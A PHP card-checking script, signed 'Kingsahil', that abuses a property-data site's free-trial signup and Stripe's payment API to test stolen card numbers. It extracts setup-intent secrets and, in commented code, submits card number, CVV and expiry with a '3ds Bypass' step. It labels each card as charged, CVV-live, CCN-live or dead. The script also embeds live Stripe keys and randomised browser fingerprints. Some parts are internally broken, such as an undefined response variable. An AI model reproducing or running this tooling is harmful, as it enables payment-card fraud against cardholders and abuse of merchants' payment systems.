<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);
##############################(proxy)####################
// $proxy = [
// 		'isp2.hydraproxy.com',
// 	];
###################################[cs_live take]#####################
// set POST request parameters
$url = "https://propertydata.co.uk/free-trial/2";
$content = "md=yEyl84BbIgWaMvu5OWSe_VHHAlMqfU0FVwNUZGAlb84-1682247460-0-AZDvdB-GqMmngaQe9t6RTqXWd9LN4cEEIuOsnd0v56DbytVSxeRFg4zjOric9zJ6mJjeUxwov9wMGgy3Cf4ynb-lvD9BQOZtmukz6NGbq507njhNb_8ex9wI4iI8_WGAahitILRbhqTUCgGnHa_hVDkaXFMJjrggKJf8nObRvMSw2UGd13xyPQ162_df2QLkPdbeshzvsfDzthF8SDfO1EbMV-jGj83TmrrkaHl7yv9CsDqOGYj_2Zl5jo1Bbw1CYTNrfXNuBu2Xzwv5ERGQLNcqqot9WqYaYmzjghNMTBQuoQIS4j6QaPuXl8QSsalzAPG2wUC5jNNLLIw0Ue1TB3VivpSjglwVpbok6qgKFrFcJS05Zru3NJ1LTAVUmL2xmwmXa-ix-RrkexvvXTQ3uqyaAxUPwpGqZIjmC1KICTp0q550fcYe2J9Ps9KGu4d5QGPvSVrRVSOKESgemQrpAqay5NZmbvTsFU7LPjocBbkUzuTz4LnGNRtwMqmYikes53cbl2_wELYJArcOh8r6ItOteMW6S05YDKSrJh7F5gvb4m4e_cMyBjCxblJVXpnaG-pdbMTgzIhR_KwNtG0Yr_6I0paBFEof1YTqwT2n0uQPXwKpJo-0W7GLxc4AGQuwJsT2VV-FMTqtYKXfYMIjsiAMnvcNevZvdgBGwCVi9clcab0Lfq-y1tjcsQaUHF6mA-sQV3sE6c_9PGXk0HxYRMwXs9SVK8btZgrMUnqInUxLlsIXj742cHh7hJMH6IIZSQi1RIM43-nbmgaR0FtyiJJMOEBBUsnydPQ5b_pKULxhy3QGcS31ZNobMLMageTG048zay1aq57HzQfPAXUZ9EpyljMiIV6U6SucPcQPHoiwKMyOq-HWHEfaTx85a2U0XWTYTwQcCzUSBA75N_whARV5kcx9lQznsPJBHuA2aHxEWM0pThA9qlHe2B93aEIsA0PdhDDUsJWAArqo8hzsCxRObl0-rN5ReEWgt2teK-06kVjc-XPJzDyzCiroTHPDkmwX9LxsRpRVzvNO0I_myVLrPb8fe9QYPYas_wM6YrcvcMT12Py9gRu4hU4KpeIzWw9eVLMNsMVPD2SJ309ozn_1fPCQBWVuHj_pgvl-qvBDrsC1VgqEMt9P-Pgc912UG6sYp1FKz0ZELaunEAu5L2MIGruqar_V7S8fhxLpQEWCH2Z0f71khar2e3I-kSvCZbq_ug6f6Tk-divT7y92uazjCqhI2GoHifhMxfX868uz0HWSyhn6C6xm_6-ITxTLJxHUC-TrVaui31CXpS0LOlab5ENFj_NHVLoTZitXaobrO1hy2ow7_bnSxTNlsEFWDoOL--9kD6yoxCanMbHloMZQIl0lCacFGQI029oUXFvMY2xTOI3xmrU1HpsJHjHqrVwUF-bxEgoNNe-20VvWDi4AQPvGAJjJ45QZgOHsVZ0TZ2rljqNPuW29A_y2gVFiGI_JLdGmsuVvdU5W_3GqMvpnIdfLo-BFz7QQ4ylq7sj6fl6lvJPxDbxXovN65I9Qex13Xp5vAPrK3hlVvPIMSDIesc1lEtnCKUfPolSy3gtMfG-L4xNWNbwd52CLTyyCdELeVFZAZYc-rji4OwQjVxnj1swm9AoGff3UD2bk8GxPX7ZdjWu9cuEEX326ZxiFe3EpKXcqNFwudt6zE9tDcWna42-C_-hLxqD4wlznIslT0pw5DQCZ-bsmDQqsONrQmYfqKk1NMMWCcCrkML92OUjINTP7wsbWJxlzM5GJHYuge_PbWXcvVC0L7p4JrVuPHC3pRDWab7ldyfPvP-5OkFM821TncOzPDirxx6THY-92HEopZ8oc3k0s0rg2dPaJ21x1PTJkorasSwctMLQdZllgab4Mz5WmBV49V08Zuzmi_qVPjRKYPNB_JS9VoMNZypiVrDv-NshBcRTax0wnJrGnU9MlyjTjeJCXJ13CLQz504VHN93WJoykYohplc1XlccBjjKWknQieeH55ls5lC9sJF8Nkml8WH_x8SpfoRbdqmU9u0ybEz6L2X5exChW_jWJVldI8FH3I3xdchkdY0akyPWn-iUd7lKZRy45azRWIJKc4_zsKmZJ8wbHRD23gBW1Vspn8zi5cQTuHSu49TyZPvsPAufPp85IohTl5Zn4zUtvTtj81c6twKrmUlYUC229ZB0TxT2JwdloJp7QbgfdCNKyRKJLWiGHTStgm_N2KerBNiLSR6iR9LNnkNlMcSP6661agoAQmZ9wZl_i9JaTDEtmTaytqcd5YGmEvIe2mWMU11XpoQvdCnPuA1-7fOhAgywb61XqClqgro0RrT-BomiWoKOzRF8hf96CcPxxKrIW2sD946hh7b2rB7l08a7vrf0V6CgvK6wcPgy0fJ1eXO1ykCkkJOWDCYMxMUHxwfdzEqNY6TYLscTT_awzHyJMk63YfoFFFUOkcgcFS9nkz2WDr7wvjarp_xuo0zP-6ij2_oJti0XiqeBCLB-kEcU-KP5HE_fE9p5atqU3RlYeK300Uu2akNTveJqgKk-Qt2OKjrCt0iuNS7BDugFFpUFkHxvbH7wEoXMWnUbiMEUSEBCFN4xoFEa-Gu40iHh6cyT-vmHz2PxbIakLSu8K4fgURhsGYjerZsAcQHef37CAsGCdT7tC0NZQnZluH9l6KWvDsGoF8uRho81SLBfrRISV1YNelE-wqWj07vkhkYG-Fr1CxwU_EoCD9H-qNP1dMwEMsAkthfSqzrw6slHnpyTeA19YsfboJsb1_eHj2aUtemNIwKvUyFqUXRWOxZnDzPGylX6M6sqE1ypxG88foq37dZyqPYJq9BKnKJbQ6PB0WXU5uzhMw44ZKsijKKGeKuB5KanqTdetax9CqEe2CmNAAkpHUxlDj8J-CDkh3EFNGZoR3kD5uqzn8skh4Rio_ktbJexX5qh6pR8Xm7yDAR5Qe5NvRBGGT-QpYruZ7Rhb3Cr2C_qmUGtAuEP43iPRF0pXkapaMhSJSkwYiFu8Gd-by8FeKI9BbSv-O470FU0&sh=bbe303f823353b650584e8a8d4895130&aw=dIiIALdMYvcx-15-7bc59643aaae8e8d&cf_ch_cp_return=fe18a273ba9c24d38def15473832e390%7C%7B%22managed_clearance%22%3A%22ni%22%7D";
$contentType = "application/x-www-form-urlencoded";
$headers = array(
    "origin: https://propertydata.co.uk",
    "referer: https://propertydata.co.uk/free-trial/2?__cf_chl_tk=KhQ32JHNgz2ceu.IpCQHlPCO_EbBQc1m44Lg2s1d8ds-1682247460-0-gaNycGzNDBA",
    "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
    "sec-ch-ua-mobile: ?0",
    "sec-ch-ua-platform: \"Windows\"",
    "sec-fetch-dest: document",
    "sec-fetch-mode: navigate",
    "sec-fetch-site: same-origin",
    "sec-fetch-user: ?1",
    "upgrade-insecure-requests: 1",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
);

// Create a new cURL resource
$ch = curl_init();

// Set URL and other cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Send the request and get the response
$response = curl_exec($ch);

// Close cURL resource
curl_close($ch);

// Extract client_secret and pi from the response
preg_match('/data-type="setupIntent" data-secret="(.+?)"/', $response, $matches);
$client_secret = $matches[1];

preg_match('/name="setup_intent_id" value="(.+?)"/', $response, $matches);
$pi = $matches[1];

// do something with client_secret and pi
echo "client_secret: $client_secret\n";
echo "pi: $pi\n";

#-------------Post pi---------------------#

   // $ch = curl_init();
   //      curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$pi.'/confirm');
   //      curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   //      curl_setopt($ch, CURLOPT_HEADER, 0);
   //      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   //             'authority: api.stripe.com',
   //             'method: POST',
   //             'path: /v1/setup_intents/'.$pi.'/confirm',
   //             'scheme: https',
   //             'accept: application/json',
   //             'accept-language: en-US,en;q=0.9',
   //             'content-type: application/x-www-form-urlencoded',
   //             'origin: https://js.stripe.com',
   //             'referer: https://js.stripe.com/',
   //             'sec-fetch-dest: empty',
   //             'sec-fetch-mode: cors',
   //             'sec-fetch-site: same-origin',
   //             'sec-gpc: 1',
   //             'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
   //      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
   //      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   //      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   //      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   //      curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Mike&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=84431d32-8e81-4e3e-aea9-ab0c7f4c3a773df328&payment_method_data[muid]=63ea7594-e7fc-4a5b-b242-7794b90cc9a0a9bef0&payment_method_data[sid]=72bc311d-bf61-42a2-b1b0-99ab365640049ae505&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]=52191&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_7aXJ3h0fKi96m8vYXYDvCdOU&client_secret='.$client_secret.'');
        
   //      $r2 = curl_exec($ch);
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "https://hooks.stripe.com/redirect/authenticate/"))   
// {
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $r4 = curl_exec($ch);
             
// }
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "three_d_secure_2_source"))   
// {
//                 $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: api.stripe.com',
//                'method: POST',
//                'path: /v1/3ds2/authenticate',
//                'scheme: https',
//                'accept: application/json',
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                'origin: https://js.stripe.com',
//                'referer: https://js.stripe.com/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
//                'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk');
        
//         $srcresult = curl_exec($ch);
      
//   }
// ########################[result url]#####################

//     $ch = curl_init();
//           curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk&is_stripe_sdk=false&client_secret='.$client_secret.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $result31 = curl_exec($ch);


########################[Responses]############################
///// [2REQ - RSOP]

if(strpos($r2,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

// elseif(strpos($result31,'Membership Confirmation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your support')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your donation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'/wishlist-member/?reg=')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'Thank You')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, '\"success\":true')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'pass')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'wcf-key')) {
//  $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';

  
// }

elseif(strpos($r2, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($r2,'card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, '\"cvc_check\": \"pass\"')) {
  $status = '#CVV';
  $cc_code = '『 CVC_CHECK: PASS ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, 'insufficient_funds')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "security code is invalid" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Security code is incorrect" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card_decline_rate_limit_exceeded" )) {
  $status = 'Dead❌';
  $cc_code = '『 card_decline_rate_limit_exceeded 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "-----BEGIN CERTIFICATE-----" )) {
  $status = 'Dead❌';
  $cc_code = '『 3ds OTP 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($r2, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($r2, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected Form Ur cards 』';
  $reqfind = '2 Req';
}




//=======================[Responses-END]==============================//


    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.''.$bindata1.'</br>';

    echo "<b>Last result=</b>$r2<br><br>";
//sleep(2)
   
?> 